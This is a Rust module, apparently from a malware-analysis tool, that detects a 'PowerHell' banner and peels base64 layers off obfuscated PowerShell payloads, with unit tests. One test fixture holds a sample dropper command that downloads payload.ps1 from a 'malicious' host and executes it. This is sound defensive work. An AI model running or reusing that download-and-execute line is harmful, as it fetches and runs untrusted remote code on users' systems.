use base64::Engine;
use base64::engine::general_purpose::STANDARD as BASE64_STD;
use lazy_regex::regex;
use regex::Regex;
use serde::Serialize;
use std::sync::LazyLock;

use crate::error::{Error, Result};

const MAX_BASE64_INPUT: usize = 2 * 1024 * 1024;

#[derive(Debug, Clone, Serialize)]
pub struct PowerHellReport {
    pub stages: Vec<String>,
    pub output: String,
}

static B64_BLOB: LazyLock<&'static Regex> =
    LazyLock::new(|| regex!(r"(?ms)^[A-Za-z0-9+/=]{120,}$"));

static POWERHELL_HEADER: LazyLock<&'static Regex> =
    LazyLock::new(|| regex!(r"(?i)PowerHell|Power-Hell|powerhell-2026"));

pub fn reverse_powerhell(input: &str) -> Result<PowerHellReport> {
    let mut stages: Vec<String> = Vec::new();
    if POWERHELL_HEADER.is_match(input) {
        stages.push("detect-powerhell-banner".to_owned());
    }
    let mut current: String = input.to_owned();
    for _ in 0..8usize {
        let Some(blob): Option<&str> = locate_payload_blob(&current) else {
            break;
        };
        if blob.trim().len() > MAX_BASE64_INPUT {
            return Err(Error::InputTooLarge {
                what: "powerhell payload",
                max_bytes: MAX_BASE64_INPUT,
            });
        }
        let Ok(decoded): std::result::Result<Vec<u8>, base64::DecodeError> =
            BASE64_STD.decode(blob.trim())
        else {
            break;
        };
        let next: String = String::from_utf8_lossy(&decoded).into_owned();
        if next == current {
            break;
        }
        stages.push("base64-peel".to_owned());
        current = next;
    }
    Ok(PowerHellReport {
        stages,
        output: current,
    })
}

fn locate_payload_blob(s: &str) -> Option<&str> {
    B64_BLOB
        .find_iter(s)
        .max_by_key(|m: &regex::Match<'_>| m.as_str().len())
        .map(|m: regex::Match<'_>| m.as_str())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn peels_single_base64_layer() -> Result<()> {
        let inner: &str = "Invoke-WebRequest -Uri http://malicious/payload.ps1 -OutFile $env:TEMP\\payload.ps1; & $env:TEMP\\payload.ps1";
        let b64: String = BASE64_STD.encode(inner);
        assert!(
            b64.len() >= 120,
            "the payload must encode to a blob the 120-character locator accepts"
        );
        let wrapped: String = format!("# PowerHell 2026 stub\n{b64}\n");
        let r: PowerHellReport = reverse_powerhell(&wrapped)?;
        assert_eq!(r.stages, ["detect-powerhell-banner", "base64-peel"]);
        assert_eq!(r.output, inner);
        Ok(())
    }

    #[test]
    fn oversized_payload_is_rejected_before_decode() {
        let oversized: String = "A".repeat(MAX_BASE64_INPUT + 1);
        let result: Result<PowerHellReport> = reverse_powerhell(&oversized);
        assert!(matches!(
            result,
            Err(crate::error::Error::InputTooLarge {
                what: "powerhell payload",
                max_bytes: MAX_BASE64_INPUT
            })
        ));
    }
}
